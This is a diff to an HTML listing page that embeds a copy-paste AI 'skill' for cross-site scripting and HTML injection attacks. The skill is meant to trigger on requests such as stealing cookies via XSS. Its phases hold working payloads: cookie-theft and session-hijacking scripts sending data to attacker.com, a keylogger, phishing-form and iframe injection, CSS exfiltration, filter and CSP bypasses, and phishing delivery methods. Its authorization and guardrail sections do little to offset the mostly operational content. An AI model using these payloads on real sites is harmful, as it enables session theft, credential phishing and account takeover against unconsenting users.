@@ -33,20 +33,15 @@
     .desc{font-size:18px;color:#444;margin-bottom:32px;line-height:1.7}
     .section{background:#fff;border:1px solid #e5e5e5;border-radius:16px;padding:28px;margin-bottom:24px}
     .section h2{font-size:20px;font-weight:600;margin-bottom:16px;padding-bottom:12px;border-bottom:1px solid #e5e5e5}
-    .install-box{background:#1a1a1a;border-radius:12px;padding:20px;margin-bottom:16px}
-    .install-box p{color:#888;font-size:13px;margin-bottom:8px}
-    .install-box code{display:block;color:#4ade80;font-family:'JetBrains Mono',monospace;font-size:14px;word-break:break-all}
+    .copy-box{background:#1a1a1a;border-radius:12px;padding:20px;margin-bottom:16px}
+    .copy-box p{color:#888;font-size:13px;margin-bottom:8px}
+    .copy-box code{display:block;color:#4ade80;font-family:'JetBrains Mono',monospace;font-size:14px;word-break:break-all}
     .copy-btn{float:right;padding:8px 16px;background:#fff;color:#1a1a1a;border:none;border-radius:6px;cursor:pointer;font-size:13px;font-weight:500}
     .copy-btn:hover{background:#f5f5f5}
     pre{background:#f8f8f8;border:1px solid #e5e5e5;border-radius:12px;padding:20px;overflow-x:auto;font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.5}
-    .how-to{background:#fff;border:1px solid #e5e5e5;border-radius:16px;padding:28px}
-    .how-to h2{font-size:20px;font-weight:600;margin-bottom:16px}
-    .how-to ol{margin:16px 0;padding-left:24px}
-    .how-to li{margin-bottom:12px;color:#444}
-    .how-to code{background:#f5f5f5;padding:2px 6px;border-radius:4px;font-size:13px}
     .tags{display:flex;gap:8px;flex-wrap:wrap;margin-top:16px}
     .tag{padding:6px 12px;background:#f5f5f5;border-radius:20px;font-size:12px;color:#666}
-    @media(max-width:768px){.header{flex-direction:column}.install-box code{font-size:12px}}
+    @media(max-width:768px){.header{flex-direction:column}.copy-box code{font-size:12px}}
   </style>
 </head>
 <body>
@@ -83,18 +78,516 @@
     <p class="desc">This skill should be used when the user asks to "test for XSS vulnerabilities", "perform cross-site scripting attacks", "identify HTML injection flaws", "exploit client-side injection vulnerabilities", "steal cookies via XSS", or "bypass content security policies". It provides comprehensive techniques for detecting, exploiting, and understanding XSS and HTML injection attack vectors in web applications.</p>
 
     <div class="section">
-      <h2>How to Use</h2>
-      <div class="how-to">
-        <ol>
-          <li><strong>Install via CLI:</strong> Run <code>npx aiccli install skills/xss-html-injection</code> in your terminal</li>
-          <li><strong>Manual install:</strong> Copy the configuration below and add it to your project's config</li>
-        </ol>
-        
-        <div class="install-box">
-          <button class="copy-btn" onclick="copyConfig()">Copy Config</button>
-          <p>Installation Command:</p>
-          <code id="install-cmd">npx aiccli install skills/xss-html-injection</code>
-        </div>
+      <h2>How to Install</h2>
+      <ol style="margin:16px 0;padding-left:24px;color:#444">
+        <li style="margin-bottom:12px"><strong>Copy the config</strong> - Click the "Copy Config" button below</li>
+        <li style="margin-bottom:12px"><strong>Add to your project</strong> - Paste the code into the appropriate config file</li>
+        <li style="margin-bottom:12px"><strong>Done!</strong> - The component is now available in your AI</li>
+      </ol>
+      
+      <div class="copy-box">
+        <button class="copy-btn" onclick="copyConfig()">Copy Config</button>
+        <p>Configuration (click to copy):</p>
+        <code id="install-cmd">---
+name: Cross-Site Scripting and HTML Injection Testing
+description: This skill should be used when the user asks to &quot;test for XSS vulnerabilities&quot;, &quot;perform cross-site scripting attacks&quot;, &quot;identify HTML injection flaws&quot;, &quot;exploit client-side injection vulnerabilities&quot;, &quot;steal cookies via XSS&quot;, or &quot;bypass content security policies&quot;. It provides comprehensive techniques for detecting, exploiting, and understanding XSS and HTML injection attack vectors in web applications.
+metadata:
+  author: zebbern
+  version: &quot;1.1&quot;
+---
+
+# Cross-Site Scripting and HTML Injection Testing
+
+## Purpose
+
+Execute comprehensive client-side injection vulnerability assessments on web applications to identify XSS and HTML injection flaws, demonstrate exploitation techniques for session hijacking and credential theft, and validate input sanitization and output encoding mechanisms. This skill enables systematic detection and exploitation across stored, reflected, and DOM-based attack vectors.
+
+## Inputs / Prerequisites
+
+### Required Access
+- Target web application URL with user input fields
+- Burp Suite or browser developer tools for request analysis
+- Access to create test accounts for stored XSS testing
+- Browser with JavaScript console enabled
+
+### Technical Requirements
+- Understanding of JavaScript execution in browser context
+- Knowledge of HTML DOM structure and manipulation
+- Familiarity with HTTP request/response headers
+- Understanding of cookie attributes and session management
+
+### Legal Prerequisites
+- Written authorization for security testing
+- Defined scope including target domains and features
+- Agreement on handling of any captured session data
+- Incident response procedures established
+
+## Outputs / Deliverables
+
+- XSS/HTMLi vulnerability report with severity classifications
+- Proof-of-concept payloads demonstrating impact
+- Session hijacking demonstrations (controlled environment)
+- Remediation recommendations with CSP configurations
+
+## Core Workflow
+
+### Phase 1: Vulnerability Detection
+
+#### Identify Input Reflection Points
+Locate areas where user input is reflected in responses:
+
+```
+# Common injection vectors
+- Search boxes and query parameters
+- User profile fields (name, bio, comments)
+- URL fragments and hash values
+- Error messages displaying user input
+- Form fields with client-side validation only
+- Hidden form fields and parameters
+- HTTP headers (User-Agent, Referer)
+```
+
+#### Basic Detection Testing
+Insert test strings to observe application behavior:
+
+```html
+&lt;!-- Basic reflection test --&gt;
+&lt;test123&gt;
+
+&lt;!-- Script tag test --&gt;
+&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;
+
+&lt;!-- Event handler test --&gt;
+&lt;img src=x onerror=alert(&#039;XSS&#039;)&gt;
+
+&lt;!-- SVG-based test --&gt;
+&lt;svg onload=alert(&#039;XSS&#039;)&gt;
+
+&lt;!-- Body event test --&gt;
+&lt;body onload=alert(&#039;XSS&#039;)&gt;
+```
+
+Monitor for:
+- Raw HTML reflection without encoding
+- Partial encoding (some characters escaped)
+- JavaScript execution in browser console
+- DOM modifications visible in inspector
+
+#### Determine XSS Type
+
+**Stored XSS Indicators:**
+- Input persists after page refresh
+- Other users see injected content
+- Content stored in database/filesystem
+
+**Reflected XSS Indicators:**
+- Input appears only in current response
+- Requires victim to click crafted URL
+- No persistence across sessions
+
+**DOM-Based XSS Indicators:**
+- Input processed by client-side JavaScript
+- Server response doesn&#039;t contain payload
+- Exploitation occurs entirely in browser
+
+### Phase 2: Stored XSS Exploitation
+
+#### Identify Storage Locations
+Target areas with persistent user content:
+
+```
+- Comment sections and forums
+- User profile fields (display name, bio, location)
+- Product reviews and ratings
+- Private messages and chat systems
+- File upload metadata (filename, description)
+- Configuration settings and preferences
+```
+
+#### Craft Persistent Payloads
+
+```html
+&lt;!-- Cookie stealing payload --&gt;
+&lt;script&gt;
+document.location=&#039;http://attacker.com/steal?c=&#039;+document.cookie
+&lt;/script&gt;
+
+&lt;!-- Keylogger injection --&gt;
+&lt;script&gt;
+document.onkeypress=function(e){
+  new Image().src=&#039;http://attacker.com/log?k=&#039;+e.key;
+}
+&lt;/script&gt;
+
+&lt;!-- Session hijacking --&gt;
+&lt;script&gt;
+fetch(&#039;http://attacker.com/capture&#039;,{
+  method:&#039;POST&#039;,
+  body:JSON.stringify({cookies:document.cookie,url:location.href})
+})
+&lt;/script&gt;
+
+&lt;!-- Phishing form injection --&gt;
+&lt;div id=&quot;login&quot;&gt;
+&lt;h2&gt;Session Expired - Please Login&lt;/h2&gt;
+&lt;form action=&quot;http://attacker.com/phish&quot; method=&quot;POST&quot;&gt;
+Username: &lt;input name=&quot;user&quot;&gt;&lt;br&gt;
+Password: &lt;input type=&quot;password&quot; name=&quot;pass&quot;&gt;&lt;br&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;
+&lt;/form&gt;
+&lt;/div&gt;
+```
+
+### Phase 3: Reflected XSS Exploitation
+
+#### Construct Malicious URLs
+Build URLs containing XSS payloads:
+
+```
+# Basic reflected payload
+https://target.com/search?q=&lt;script&gt;alert(document.domain)&lt;/script&gt;
+
+# URL-encoded payload
+https://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E
+
+# Event handler in parameter
+https://target.com/page?name=&quot;&gt;&lt;img src=x onerror=alert(1)&gt;
+
+# Fragment-based (for DOM XSS)
+https://target.com/page#&lt;script&gt;alert(1)&lt;/script&gt;
+```
+
+#### Delivery Methods
+Techniques for delivering reflected XSS to victims:
+
+```
+1. Phishing emails with crafted links
+2. Social media message distribution
+3. URL shorteners to obscure payload
+4. QR codes encoding malicious URLs
+5. Redirect chains through trusted domains
+```
+
+### Phase 4: DOM-Based XSS Exploitation
+
+#### Identify Vulnerable Sinks
+Locate JavaScript functions that process user input:
+
+```javascript
+// Dangerous sinks
+document.write()
+document.writeln()
+element.innerHTML
+element.outerHTML
+element.insertAdjacentHTML()
+eval()
+setTimeout()
+setInterval()
+Function()
+location.href
+location.assign()
+location.replace()
+```
+
+#### Identify Sources
+Locate where user-controlled data enters the application:
+
+```javascript
+// User-controllable sources
+location.hash
+location.search
+location.href
+document.URL
+document.referrer
+window.name
+postMessage data
+localStorage/sessionStorage
+```
+
+#### DOM XSS Payloads
+
+```javascript
+// Hash-based injection
+https://target.com/page#&lt;img src=x onerror=alert(1)&gt;
+
+// URL parameter injection (processed client-side)
+https://target.com/page?default=&lt;script&gt;alert(1)&lt;/script&gt;
+
+// PostMessage exploitation
+// On attacker page:
+&lt;iframe src=&quot;https://target.com/vulnerable&quot;&gt;&lt;/iframe&gt;
+&lt;script&gt;
+frames[0].postMessage(&#039;&lt;img src=x onerror=alert(1)&gt;&#039;,&#039;*&#039;);
+&lt;/script&gt;
+```
+
+### Phase 5: HTML Injection Techniques
+
+#### Reflected HTML Injection
+Modify page appearance without JavaScript:
+
+```html
+&lt;!-- Content injection --&gt;
+&lt;h1&gt;SITE HACKED&lt;/h1&gt;
+
+&lt;!-- Form hijacking --&gt;
+&lt;form action=&quot;http://attacker.com/capture&quot;&gt;
+&lt;input name=&quot;credentials&quot; placeholder=&quot;Enter password&quot;&gt;
+&lt;button&gt;Submit&lt;/button&gt;
+&lt;/form&gt;
+
+&lt;!-- CSS injection for data exfiltration --&gt;
+&lt;style&gt;
+input[value^=&quot;a&quot;]{background:url(http://attacker.com/a)}
+input[value^=&quot;b&quot;]{background:url(http://attacker.com/b)}
+&lt;/style&gt;
+
+&lt;!-- iframe injection --&gt;
+&lt;iframe src=&quot;http://attacker.com/phishing&quot; style=&quot;position:absolute;top:0;left:0;width:100%;height:100%&quot;&gt;&lt;/iframe&gt;
+```
+
+#### Stored HTML Injection
+Persistent content manipulation:
+
+```html
+&lt;!-- Marquee disruption --&gt;
+&lt;marquee&gt;Important Security Notice: Your account is compromised!&lt;/marquee&gt;
+
+&lt;!-- Style override --&gt;
+&lt;style&gt;body{background:red !important;}&lt;/style&gt;
+
+&lt;!-- Hidden content with CSS --&gt;
+&lt;div style=&quot;position:fixed;top:0;left:0;width:100%;background:white;z-index:9999;&quot;&gt;
+Fake login form or misleading content here
+&lt;/div&gt;
+```
+
+### Phase 6: Filter Bypass Techniques
+
+#### Tag and Attribute Variations
+
+```html
+&lt;!-- Case variation --&gt;
+&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;
+&lt;IMG SRC=x ONERROR=alert(1)&gt;
+
+&lt;!-- Alternative tags --&gt;
+&lt;svg/onload=alert(1)&gt;
+&lt;body/onload=alert(1)&gt;
+&lt;marquee/onstart=alert(1)&gt;
+&lt;details/open/ontoggle=alert(1)&gt;
+&lt;video&gt;&lt;source onerror=alert(1)&gt;
+&lt;audio src=x onerror=alert(1)&gt;
+
+&lt;!-- Malformed tags --&gt;
+&lt;img src=x onerror=alert(1)//
+&lt;img &quot;&quot;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;
+```
+
+#### Encoding Bypass
+
+```html
+&lt;!-- HTML entity encoding --&gt;
+&lt;img src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&gt;
+
+&lt;!-- Hex encoding --&gt;
+&lt;img src=x onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;(1)&gt;
+
+&lt;!-- Unicode encoding --&gt;
+&lt;script&gt;\u0061lert(1)&lt;/script&gt;
+
+&lt;!-- Mixed encoding --&gt;
+&lt;img src=x onerror=\u0061\u006cert(1)&gt;
+```
+
+#### JavaScript Obfuscation
+
+```javascript
+// String concatenation
+&lt;script&gt;eval(&#039;al&#039;+&#039;ert(1)&#039;)&lt;/script&gt;
+
+// Template literals
+&lt;script&gt;alert`1`&lt;/script&gt;
+
+// Constructor execution
+&lt;script&gt;[].constructor.constructor(&#039;alert(1)&#039;)()&lt;/script&gt;
+
+// Base64 encoding
+&lt;script&gt;eval(atob(&#039;YWxlcnQoMSk=&#039;))&lt;/script&gt;
+
+// Without parentheses
+&lt;script&gt;alert`1`&lt;/script&gt;
+&lt;script&gt;throw/a]a]/.source+onerror=alert&lt;/script&gt;
+```
+
+#### Whitespace and Comment Bypass
+
+```html
+&lt;!-- Tab/newline insertion --&gt;
+&lt;img src=x	onerror
+=alert(1)&gt;
+
+&lt;!-- JavaScript comments --&gt;
+&lt;script&gt;/**/alert(1)/**/&lt;/script&gt;
+
+&lt;!-- HTML comments in attributes --&gt;
+&lt;img src=x onerror=&quot;alert(1)&quot;&lt;!--comment--&gt;
+```
+
+## Quick Reference
+
+### XSS Detection Checklist
+```
+1. Insert &lt;script&gt;alert(1)&lt;/script&gt; → Check execution
+2. Insert &lt;img src=x onerror=alert(1)&gt; → Check event handler
+3. Insert &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; → Test attribute escape
+4. Insert javascript:alert(1) → Test href/src attributes
+5. Check URL hash handling → DOM XSS potential
+```
+
+### Common XSS Payloads
+
+| Context | Payload |
+|---------|---------|
+| HTML body | `&lt;script&gt;alert(1)&lt;/script&gt;` |
+| HTML attribute | `&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;` |
+| JavaScript string | `&#039;;alert(1)//` |
+| JavaScript template | `${alert(1)}` |
+| URL attribute | `javascript:alert(1)` |
+| CSS context | `&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;` |
+| SVG context | `&lt;svg onload=alert(1)&gt;` |
+
+### Cookie Theft Payload
+```javascript
+&lt;script&gt;
+new Image().src=&#039;http://attacker.com/c=&#039;+btoa(document.cookie);
+&lt;/script&gt;
+```
+
+### Session Hijacking Template
+```javascript
+&lt;script&gt;
+fetch(&#039;https://attacker.com/log&#039;,{
+  method:&#039;POST&#039;,
+  mode:&#039;no-cors&#039;,
+  body:JSON.stringify({
+    cookies:document.cookie,
+    localStorage:JSON.stringify(localStorage),
+    url:location.href
+  })
+});
+&lt;/script&gt;
+```
+
+## Constraints and Guardrails
+
+### Operational Boundaries
+- Never inject payloads that could damage production systems
+- Limit cookie/session capture to demonstration purposes only
+- Avoid payloads that could spread to unintended users (worm behavior)
+- Do not exfiltrate real user data beyond scope requirements
+
+### Technical Limitations
+- Content Security Policy (CSP) may block inline scripts
+- HttpOnly cookies prevent JavaScript access
+- SameSite cookie attributes limit cross-origin attacks
+- Modern frameworks often auto-escape outputs
+
+### Legal and Ethical Requirements
+- Written authorization required before testing
+- Report critical XSS vulnerabilities immediately
+- Handle captured credentials per data protection agreements
+- Do not use discovered vulnerabilities for unauthorized access
+
+## Examples
+
+### Example 1: Stored XSS in Comment Section
+
+**Scenario**: Blog comment feature vulnerable to stored XSS
+
+**Detection**:
+```
+POST /api/comments
+Content-Type: application/json
+
+{&quot;body&quot;: &quot;&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;&quot;, &quot;postId&quot;: 123}
+```
+
+**Observation**: Comment renders and script executes for all viewers
+
+**Exploitation Payload**:
+```html
+&lt;script&gt;
+var i = new Image();
+i.src = &#039;https://attacker.com/steal?cookie=&#039; + encodeURIComponent(document.cookie);
+&lt;/script&gt;
+```
+
+**Result**: Every user viewing the comment has their session cookie sent to attacker&#039;s server.
+
+### Example 2: Reflected XSS via Search Parameter
+
+**Scenario**: Search results page reflects query without encoding
+
+**Vulnerable URL**:
+```
+https://shop.example.com/search?q=test
+```
+
+**Detection Test**:
+```
+https://shop.example.com/search?q=&lt;script&gt;alert(document.domain)&lt;/script&gt;
+```
+
+**Crafted Attack URL**:
+```
+https://shop.example.com/search?q=%3Cimg%20src=x%20onerror=%22fetch(&#039;https://attacker.com/log?c=&#039;+document.cookie)%22%3E
+```
+
+**Delivery**: URL sent via phishing email to target user.
+
+### Example 3: DOM-Based XSS via Hash Fragment
+
+**Scenario**: JavaScript reads URL hash and inserts into DOM
+
+**Vulnerable Code**:
+```javascript
+document.getElementById(&#039;welcome&#039;).innerHTML = &#039;Hello, &#039; + location.hash.slice(1);
+```
+
+**Attack URL**:
+```
+https://app.example.com/dashboard#&lt;img src=x onerror=alert(document.cookie)&gt;
+```
+
+**Result**: Script executes entirely client-side; payload never touches server.
+
+### Example 4: CSP Bypass via JSONP Endpoint
+
+**Scenario**: Site has CSP but allows trusted CDN
+
+**CSP Header**:
+```
+Content-Security-Policy: script-src &#039;self&#039; https://cdn.trusted.com
+```
+
+**Bypass**: Find JSONP endpoint on trusted domain:
+```html
+&lt;script src=&quot;https://cdn.trusted.com/api/jsonp?callback=alert&quot;&gt;&lt;/script&gt;
+```
+
+**Result**: CSP bypassed using allowed script source.
+
+## Troubleshooting
+
+| Issue | Solutions |
+|-------|-----------|
+| Script not executing | Check CSP blocking; verify encoding; try event handlers (img, svg onerror); confirm JS enabled |
+| Payload appears but doesn&#039;t execute | Break out of attribute context with `&quot;` or `&#039;`; check if inside comment; test different contexts |
+| Cookies not accessible | Check HttpOnly flag; try localStorage/sessionStorage; use no-cors mode |
+| CSP blocking payloads | Find JSONP on whitelisted domains; check for unsafe-inline; test base-uri bypass |
+| WAF blocking requests | Use encoding variations; fragment payload; null bytes; case variations |
+</code>
       </div>
     </div>
 
